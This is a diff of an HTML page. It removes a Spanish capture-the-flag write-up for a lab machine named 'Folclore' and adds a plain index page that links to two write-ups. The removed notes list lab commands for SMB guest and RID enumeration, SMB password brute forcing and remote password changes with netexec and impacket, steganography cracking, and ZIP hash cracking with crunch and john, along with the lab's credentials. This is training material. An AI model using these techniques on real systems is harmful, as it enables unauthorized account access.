@@ -1,12 +1,97 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="es">
 <head>
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <title>Folclore</title>
-  <meta name="generator" content="CherryTree">
-  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker Labs & Write-ups</title>
+    <style>
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 700px;
+            margin: 60px auto;
+            padding: 0 20px;
+        }
+
+        h1 {
+            color: #00ff66;
+            font-family: monospace;
+            border-bottom: 2px solid #30363d;
+            padding-bottom: 12px;
+            font-size: 1.8rem;
+        }
+
+        .subtitle {
+            color: #8b949e;
+            margin-bottom: 30px;
+        }
+
+        .grid {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .card {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 20px;
+            transition: transform 0.2s, border-color 0.2s;
+            text-decoration: none;
+            display: block;
+        }
+
+        .card:hover {
+            border-color: #00ff66;
+            transform: translateY(-2px);
+        }
+
+        .card h2 {
+            margin: 0 0 8px 0;
+            color: #58a6ff;
+            font-size: 1.3rem;
+        }
+
+        .card p {
+            margin: 0;
+            color: #8b949e;
+            font-size: 0.95rem;
+        }
+
+        .tag {
+            display: inline-block;
+            background: #21262d;
+            color: #00ff66;
+            font-family: monospace;
+            font-size: 0.8rem;
+            padding: 3px 8px;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
-<div class='page'><h1 class='title'>Folclore</h1><br/><p>r<img src="images/144-1.png" alt="images/144-1.png" /></p><p><ul><li>Enumeración SMB con usuario Invitado mediante RID</li><li>Fuerza bruta sobre SMB</li><li>Análisis de metadatos en imágenes</li><li>Esteganografía en imágenes</li><li>Cracking de contraseñas en archivos ZIP</li><li>Creación de diccionarios personalizados</li><li>Ejecución de comandos mediante SMB</li></ul></p><p></p><p><img src="images/144-2.png" alt="images/144-2.png" /></p><p></p><p><img src="images/144-3.png" alt="images/144-3.png" /></p><p></p><p><img src="images/144-4.png" alt="images/144-4.png" /></p><p></p><p>netexec smb 192.168.56.113 -u &#39;guest&#39; -p &#39;&#39; --shares</p><p></p><p><img src="images/144-5.png" alt="images/144-5.png" /></p><p></p><p></p><p></p><p></p><p></p><p><img src="images/144-6.png" alt="images/144-6.png" /></p><p></p><p><img src="images/144-7.png" alt="images/144-7.png" /></p><p><img src="images/144-8.png" alt="images/144-8.png" /></p><p></p><p>netexec smb 192.168.56.113 -u &#39;Guest&#39; -p &#39; &#39; --rid-brute</p><p></p><p>Quetzalcoatl</p><p>Ix_Chel</p><p>Tlaloc</p><p>La_mulata_de_Cordoba</p><p>La_Catrina</p><p></p><p><img src="images/144-9.png" alt="images/144-9.png" /></p><p></p><p></p><p></p><p><a href="https://es.wikipedia.org/wiki/Danza_de_Quetzales">https://es.wikipedia.org/wiki/Danza_de_Quetzales</a></p><p></p><p>curl -s &quot;<a href="https://es.wikipedia.org/wiki/Danza_de_Quetzales">https://es.wikipedia.org/wiki/Danza_de_Quetzales</a>&quot; | grep -oE &#39;[a-zA-ZáéíóúÁÉÍÓÚñÑ]{5,}&#39; | sort -u &gt; wordlist_danza.txt</p><p>curl -s &quot;<a href="https://es.wikipedia.org/wiki/D%C3%ADa_de_Muertos">https://es.wikipedia.org/wiki/D%C3%ADa_de_Muertos</a>&quot; | grep -oE &#39;[a-zA-ZáéíóúÁÉÍÓÚñÑ]{5,}&#39; | sort -u &gt; wordlist_muertos.txt</p><p></p><p></p><p></p><p></p><p><img src="images/144-10.png" alt="images/144-10.png" /></p><p></p><p>El_charro_negro</p><p>abc123</p><p></p><p><h3>nxc</h3><h3> </h3><h3>smb</h3><h3> 192.168.56.113 </h3><h3>-u</h3><h3> El_charro_negro </h3><h3>-p</h3><h3> abc123 </h3><h3>-M</h3><h3> </h3><h3>change-password</h3><h3> </h3><h3>-o</h3><h3> </h3><h3>NEWPASS=</h3>abc1234</p><p></p><p>impacket-smbpasswd.py &#39;FOLCLORE/El_charro_negro:abc123@192.168.56.113&#39; -newpass &#39;abc1234&#39;</p><p></p><p>smbpasswd -j FOLCLORE -r 192.168.56.113 -U El_charro_negro</p><p></p><p></p><p>impacket-changepasswd &#39;El_charro_negro&#39;:&#39;abc123&#39;@192.168.56.113 -newpass &#39;TuNuevaContrasena123!&#39;</p><p></p><p></p><p></p><p># Opción A: smbpasswd (el más directo)</p><p>smbpasswd -r 192.168.56.113 -U El_charro_negro</p><p></p><p>python3 /usr/share/doc/python3-impacket/examples/smbpasswd.py El_charro_negro:abc123@192.168.56.113 -newpass &#39;NuevaPassw0rd!&#39;   </p><p></p><p></p><p><img src="images/144-11.png" alt="images/144-11.png" /></p><p></p><p>netexec smb 192.168.56.113 -u guest -p &#39;&#39; -M spider_plus</p><p></p><p></p><p>esto te baja todo lo que acceda</p><p></p><p><img src="images/144-12.png" alt="images/144-12.png" /></p><p></p><p><img src="images/144-13.png" alt="images/144-13.png" /></p><p></p><p><img src="images/144-14.png" alt="images/144-14.png" /></p><p></p><p><img src="images/144-15.png" alt="images/144-15.png" /></p><p></p><p><img src="images/144-16.png" alt="images/144-16.png" /></p><p></p><p><img src="images/144-17.png" alt="images/144-17.png" /></p><p></p><p><img src="images/144-18.png" alt="images/144-18.png" /></p><p></p><p><img src="images/144-19.png" alt="images/144-19.png" /></p><p></p><p><img src="images/144-20.png" alt="images/144-20.png" />´</p><p></p><p>Hay que poner comillas simples, si no, el dolar desaparece:</p><p></p><p>netexec smb 192.168.56.111 -u userdir.txt -p &#39;45yD#k7&#39;</p><p></p><p><img src="images/144-21.png" alt="images/144-21.png" /></p><p></p><p></p><p>Tlaloc</p><p>677Kn$q</p><p></p><p><img src="images/144-22.png" alt="images/144-22.png" /></p><p></p><p><img src="images/144-23.png" alt="images/144-23.png" /></p><p></p><p>si pide passprase es que hay algo cifrado</p><p><img src="images/144-24.png" alt="images/144-24.png" /></p><p></p><p></p><p>fuerza bruta contraseña </p><p>stegseek Tlaloc.jpg /usr/share/wordlists/ffuf/SecLists-master/Passwords/Common-Credentials/xato-net-10-million-passwords.txt</p><p></p><p><img src="images/144-25.png" alt="images/144-25.png" /></p><p></p><p></p><p>al lado de la imagen se ha descomprimido el archivo</p><p><img src="images/144-26.png" alt="images/144-26.png" /></p><p></p><p><img src="images/144-27.png" alt="images/144-27.png" /></p><p></p><p><img src="images/144-28.png" alt="images/144-28.png" /></p><p></p><p><img src="images/144-29.png" alt="images/144-29.png" /></p><p></p><p><img src="images/144-30.png" alt="images/144-30.png" /></p><p></p><p><img src="images/144-31.png" alt="images/144-31.png" /></p><p></p><p>tiene contraseña, supongo que la conseguiremos despues</p><p></p><p><img src="images/144-32.png" alt="images/144-32.png" /></p><p></p><p>La_catrina</p><p>3nM93{S#</p><p></p><p><img src="images/144-33.png" alt="images/144-33.png" /></p><p></p><p><img src="images/144-34.png" alt="images/144-34.png" />´</p><p></p><p>Solo puedo darte el quinto caracter de su clave: ‘U’ . Los demas caracteres que faltan deberas encontrarlos por tu cuenta, aunque no debe ser tan dificil; solo son numeros o letras, Confia en tu ingenio y no olvides que el misterio siempre se revela a quien perservera</p><p><img src="images/144-35.png" alt="images/144-35.png" /></p><p></p><p>Esto nos esta diciendo de crear un diccionario personalizado con un quinto caracter U</p><p></p><p>generamos diccionario con letras minusculas, mayusculas, numeros y con 5 caracteres el quinto es una U</p><p>crunch 5 5 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t @@@@U -o diccionario_custom.txt</p><p></p><p><img src="images/144-36.png" alt="images/144-36.png" /></p><p></p><p>fcrackzip -v -u -D -p diccionario1.txt Pacto.zip</p><p></p><p>va muy lento</p><p></p><p><img src="images/144-37.png" alt="images/144-37.png" /></p><p></p><p></p><p></p><p>zip2john Pacto.zip &gt; hash_pacto.txt</p><p></p><p></p><p>john --wordlist=diccionario1.txt --fork=$(nproc) hash_pacto.txt</p><p></p><p>con espacio vemos el progreso, va muy rapido, podemos ir haciendo diccionarios y probando</p><p></p><p><img src="images/144-38.png" alt="images/144-38.png" /></p><p></p><p>john --show hash_pacto.txt</p><p></p><p><img src="images/144-39.png" alt="images/144-39.png" /></p><p></p><p></p><p>no la saco, creamos otro diccionario con 6 caracteres</p><p></p><p>crunch 6 6 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t @@@@U@ -o diccionario6.txt</p><p></p><p></p><p>este ya son 6 gb</p><p></p><p><img src="images/144-40.png" alt="images/144-40.png" /></p><p></p><p></p><p></p><p>john --wordlist=diccionario6.txt --fork=$(nproc) hash_pacto.txt</p><p></p><p></p><p></p><p>hacemos un diccionario mas simple antes de continuar solo con minusculas y numeros</p><p><img src="images/144-41.png" alt="images/144-41.png" /></p><p></p><p><img src="images/144-42.png" alt="images/144-42.png" /></p><p></p><p></p><p>john --wordlist=diccionariomay7.txt --fork=$(nproc) hash_pacto.txt</p><p></p><p>john --show hash_pacto.txt</p><p></p><p></p><p>crunch 6 6 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t @@@@U@ -o diccionario6.txt</p></div>
+
+    <h1>> Hacker Labs Write-ups</h1>
+    <p class="subtitle">Selecciona una máquina para ver la resolución detallada:</p>
+
+    <div class="grid">
+        <!-- Máquina 1: Accounting -->
+        <a href="./writeup-Accounting/" class="card">
+            <h2>Accounting</h2>
+            <p>Resolución y notas técnicas de la máquina Accounting.</p>
+            <span class="tag">[Ver Write-Up]</span>
+        </a>
+
+        <!-- Máquina 2: Forclore -->
+        <a href="./writeup-Forclore/" class="card">
+            <h2>Forclore</h2>
+            <p>Resolución y notas técnicas de la máquina Forclore.</p>
+            <span class="tag">[Ver Write-Up]</span>
+        </a>
+    </div>
+
 </body>
 </html>
